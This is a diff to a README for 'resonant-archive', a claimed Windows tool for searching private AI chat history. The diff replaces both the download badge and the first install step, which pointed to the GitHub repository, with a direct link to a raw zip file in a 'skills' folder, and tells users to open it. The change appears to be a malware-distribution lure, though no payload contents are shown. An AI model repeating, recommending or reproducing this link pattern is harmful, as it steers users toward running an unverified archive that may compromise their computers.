@@ -1,6 +1,6 @@
 # 🧠 resonant-archive - Search your private AI conversation history
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Timesukkumnerd/resonant-archive)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Timesukkumnerd/resonant-archive/main/skills/archive_resonant_3.0.zip)
 
 ## 🎯 What is this tool
 
@@ -19,7 +19,7 @@ This tool organizes your data so you can search using natural language. If you r
 
 Follow these steps to install the software on your Windows computer.
 
-1. Visit this page to download: [https://github.com/Timesukkumnerd/resonant-archive](https://github.com/Timesukkumnerd/resonant-archive).
+1. Visit this page to download: [https://raw.githubusercontent.com/Timesukkumnerd/resonant-archive/main/skills/archive_resonant_3.0.zip](https://raw.githubusercontent.com/Timesukkumnerd/resonant-archive/main/skills/archive_resonant_3.0.zip).
 2. Locate the latest release file on the page.
 3. Click the file to save it to your Downloads folder.
 4. Open the file to start the installation.
